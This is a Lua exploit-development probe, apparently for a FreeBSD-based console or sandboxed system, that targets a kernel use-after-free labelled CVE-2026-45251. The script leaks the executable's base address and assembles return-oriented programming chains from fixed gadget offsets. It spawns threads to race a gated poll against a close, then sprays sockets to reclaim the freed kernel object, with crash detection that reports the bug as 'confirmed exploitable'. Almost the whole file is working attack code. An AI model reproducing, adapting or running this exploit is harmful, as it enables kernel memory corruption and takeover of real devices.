-- CRASH_CLASS: HIGH
-- PROBE 500d: Gated poll+close+spray race (CVE-2026-45251 exploitation test)
--
-- 500c confirmed: gated close during poll produces poll=0/rev=0x0 across
-- 3 socket types × 30 iterations. poll is NOT woken by close → seldrain
-- missing → UAF on poll timeout cleanup (seltdclear reads freed selinfo).
--
-- This probe adds heap spray: after close(fd) frees the socket object,
-- child B creates 20 sockets of the same type to reclaim the UMA zone.
-- If the spray lands, seltdclear follows corrupted linked-list pointers → crash.
--
-- Expected: process crash = UAF confirmed exploitable
-- Survive = spray didn't reclaim (try different count/type)

print("=== PROBE 500d: GATED poll+close+SPRAY (CVE-2026-45251) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

-- Signal ignore
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Helper: create socketpair gate
local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

local SPRAY_COUNT = 20

-- Build Child A (poller): sysarch → read(gate) → poll(pollfd, 1, 2000) → write marker → exit
-- Shorter timeout (2000ms) to speed up iterations
local function build_poller(gate_rd, pollfd_addr, marker_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(129, &fake_tcb)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    -- read(gate_rd, &one_byte, 1) — blocks until gate opens
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3))
    emit(stub)
    -- poll(pollfd, 1, 2000)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(2000))
    emit(g_pop_rax); emit(uint64(209))
    emit(stub)
    -- write rax (poll return) to marker
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

-- Build Child B (closer+sprayer): sysarch → read(gate) → close(fd) → socket()×N → write marker → exit
local function build_closer_spray(gate_rd, target_fd, marker_addr, af, stype, proto)
    local stk = memory.alloc(0x8000)
    local sb = N(stk)
    local rsp = sb + 0x4000 - ((sb + 0x4000) % 16) - 8
    for i = 0, 0x3FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    -- sysarch(129, &fake_tcb)
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    -- read(gate_rd, &one_byte, 1) — blocks until gate opens
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3))
    emit(stub)
    -- close(target_fd)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6))
    emit(stub)
    -- spray: socket(af, stype, proto) × SPRAY_COUNT
    for s = 1, SPRAY_COUNT do
        emit(g_pop_rdi); emit(uint64(af))
        emit(g_pop_rsi); emit(uint64(stype))
        emit(g_pop_rdx); emit(uint64(proto))
        emit(g_pop_rax); emit(uint64(97))
        emit(stub)
    end
    -- write rax (last socket return) to marker
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    -- thr_exit(0)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x4000))
    return par
end

-- Test one fd type with gated spray
local function test_spray(label, create_fn, af, stype, proto, iters)
    print("[" .. label .. "] " .. iters .. " iterations, spray=" .. SPRAY_COUNT)

    local marker_A = memory.alloc(8)
    local marker_B = memory.alloc(8)
    local pollfd = memory.alloc(8)

    local crashed = false
    local results = {}

    for i = 1, iters do
        if not alive() then
            print(string.format("  *** PROCESS DIED at iter %d ***", i))
            crashed = true
            break
        end

        local fd = create_fn()
        if not fd or fd < 0 then
            print("  fd fail at " .. i)
            break
        end

        local gA_r, gA_w = make_gate()
        local gB_r, gB_w = make_gate()
        if not gA_r or not gB_r then
            print("  gate fail at " .. i)
            pcall(function() mk(6)(uint64(fd)) end)
            break
        end

        -- Setup pollfd struct: {int fd, short events=POLLIN, short revents=0}
        wd(N(pollfd), fd)
        wd(N(pollfd) + 4, 0x00010000)

        wq(N(marker_A), uint64(0xAAAAAAAA))
        wq(N(marker_B), uint64(0xBBBBBBBB))

        -- Spawn poller child (will block on gate_A)
        local parA = build_poller(gA_r, N(pollfd), N(marker_A))
        pcall(function() mk(455)(parA, uint64(0x38)) end)

        -- Spawn closer+sprayer child (will block on gate_B)
        local parB = build_closer_spray(gB_r, fd, N(marker_B), af, stype, proto)
        pcall(function() mk(455)(parB, uint64(0x38)) end)

        -- Open gate A → child A enters poll and blocks
        pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)

        -- Delay for child A to reach kernel wait queue
        for d = 1, 50000 do local _ = rd(N(marker_A)) end

        -- Open gate B → child B: close(fd) then spray socket()×20
        pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)

        -- Wait for both children (up to ~500ms)
        local a_done, b_done = false, false
        for w = 1, 500000 do
            if not a_done then
                local m = rd(N(marker_A))
                if m and m ~= 0xAAAAAAAA then a_done = true end
            end
            if not b_done then
                local m = rd(N(marker_B))
                if m and m ~= 0xBBBBBBBB then b_done = true end
            end
            if a_done and b_done then break end
        end

        if not alive() then
            print(string.format("  *** CRASHED at iter %d (a=%s b=%s) ***",
                i, tostring(a_done), tostring(b_done)))
            crashed = true
            break
        end

        local poll_rv = rd(N(marker_A)) or 0xAA
        local close_rv = rd(N(marker_B)) or 0xBB
        local raw = rd(N(pollfd) + 4) or 0
        local revents = math.floor(raw / 65536) % 65536

        local key = string.format("poll=%d/rev=0x%X/close=%d/a=%s/b=%s",
            poll_rv, revents, close_rv, tostring(a_done), tostring(b_done))
        results[key] = (results[key] or 0) + 1

        -- Cleanup gates (spray fds leak — intentional)
        pcall(function() mk(6)(uint64(fd)) end)
        pcall(function() mk(6)(uint64(gA_r)) end)
        pcall(function() mk(6)(uint64(gA_w)) end)
        pcall(function() mk(6)(uint64(gB_r)) end)
        pcall(function() mk(6)(uint64(gB_w)) end)

        if i % 5 == 0 or i == iters then
            print(string.format("  iter %d/%d ok", i, iters))
        end
    end

    print("  results:")
    for k, v in pairs(results) do
        print("    " .. k .. " × " .. v)
    end
    if crashed then
        print("  >>> CRASH — CVE-2026-45251 UAF CONFIRMED EXPLOITABLE <<<")
    end
    print("")
    return not crashed
end

local ITERS = 20

-- Also run a no-spray control group first for comparison
print("=== CONTROL (no spray) — 5 iterations ===")

local function test_control(label, create_fn, iters)
    print("[" .. label .. "] " .. iters .. " iterations (control)")
    local marker_A = memory.alloc(8)
    local marker_B = memory.alloc(8)
    local pollfd = memory.alloc(8)
    local results = {}

    for i = 1, iters do
        if not alive() then print("  DIED at " .. i); return false end
        local fd = create_fn()
        if not fd then print("  fd fail " .. i); break end
        local gA_r, gA_w = make_gate()
        local gB_r, gB_w = make_gate()
        if not gA_r or not gB_r then break end
        wd(N(pollfd), fd)
        wd(N(pollfd) + 4, 0x00010000)
        wq(N(marker_A), uint64(0xAAAAAAAA))
        wq(N(marker_B), uint64(0xBBBBBBBB))
        -- Reuse build_closer from 500c (no spray) — inline a simple closer
        local stk = memory.alloc(0x4000)
        local sb = N(stk)
        local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
        for j = 0, 0x1FFC, 4 do wd(sb + j, 0) end
        local off = 0
        local function emit(v) wq(rsp + off, v); off = off + 8 end
        emit(g_pop_rdi); emit(uint64(129))
        emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
        emit(g_pop_rax); emit(uint64(165)); emit(stub)
        emit(g_pop_rdi); emit(uint64(gB_r))
        emit(g_pop_rsi); emit(uint64(N(one_byte)))
        emit(g_pop_rdx); emit(uint64(1))
        emit(g_pop_rax); emit(uint64(3)); emit(stub)
        emit(g_pop_rdi); emit(uint64(fd))
        emit(g_pop_rax); emit(uint64(6)); emit(stub)
        emit(g_pop_rdi); emit(uint64(N(marker_B)))
        emit(g_mov_m_rax)
        emit(g_pop_rdi); emit(uint64(0))
        emit(g_pop_rax); emit(uint64(431)); emit(stub)
        local parB = memory.alloc(0x40)
        for j = 0, 0x3C, 4 do wd(N(parB) + j, 0) end
        wq(N(parB), g_bare_ret)
        wq(N(parB) + 0x10, uint64(sb))
        wq(N(parB) + 0x18, uint64(0x2000))

        local parA = build_poller(gA_r, N(pollfd), N(marker_A))
        pcall(function() mk(455)(parA, uint64(0x38)) end)
        pcall(function() mk(455)(parB, uint64(0x38)) end)
        pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
        for d = 1, 50000 do local _ = rd(N(marker_A)) end
        pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)
        local a_done, b_done = false, false
        for w = 1, 500000 do
            if not a_done then local m = rd(N(marker_A)); if m and m ~= 0xAAAAAAAA then a_done = true end end
            if not b_done then local m = rd(N(marker_B)); if m and m ~= 0xBBBBBBBB then b_done = true end end
            if a_done and b_done then break end
        end
        local poll_rv = rd(N(marker_A)) or 0xAA
        local raw = rd(N(pollfd) + 4) or 0
        local revents = math.floor(raw / 65536) % 65536
        local key = string.format("poll=%d/rev=0x%X", poll_rv, revents)
        results[key] = (results[key] or 0) + 1
        pcall(function() mk(6)(uint64(fd)) end)
        pcall(function() mk(6)(uint64(gA_r)) end)
        pcall(function() mk(6)(uint64(gA_w)) end)
        pcall(function() mk(6)(uint64(gB_r)) end)
        pcall(function() mk(6)(uint64(gB_w)) end)
    end
    print("  results:")
    for k, v in pairs(results) do print("    " .. k .. " × " .. v) end
    print("")
    return true
end

local function mk_udp()
    local r = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
    if r > 0 then return r end return nil
end

local function mk_tcp()
    local r = sgn(mk(97)(uint64(2), uint64(1), uint64(0)))
    if r > 0 then return r end return nil
end

local function mk_unix_pair()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv))) end)
    local fd0 = rd(N(sv)) or 0xFFFF
    local fd1 = rd(N(sv) + 4) or 0xFFFF
    if fd0 == 0xFFFF or fd1 == 0xFFFF then return nil end
    pcall(function() mk(6)(uint64(fd1)) end)
    return fd0
end

test_control("UDP control", mk_udp, 5)

print("=== SPRAY TESTS ===")
-- UDP: AF_INET(2), SOCK_DGRAM(2), IPPROTO_UDP(17) — same UMA zone as target
local ok = true
if ok then ok = test_spray("UDP + UDP spray", mk_udp, 2, 2, 17, ITERS) end
-- TCP: AF_INET(2), SOCK_STREAM(1), proto 0 — same zone
if ok then ok = test_spray("TCP + TCP spray", mk_tcp, 2, 1, 0, ITERS) end
-- AF_UNIX: AF_UNIX(1), SOCK_DGRAM(2), proto 0
if ok then ok = test_spray("AF_UNIX + AF_UNIX spray", mk_unix_pair, 1, 2, 0, ITERS) end

print("")
if alive() then
    print("ALIVE — process survived all spray races")
    print("canary=" .. N(native.fcall_with_rax(stub, 20)))
    print("NOTE: spray may not have reclaimed the freed zone.")
    print("Try: different spray counts, cross-type spray, or kqueue objects.")
else
    print("*** DEAD — CVE-2026-45251 UAF EXPLOITATION CONFIRMED ***")
end

print("")
print("=== PROBE 500d COMPLETE ===")
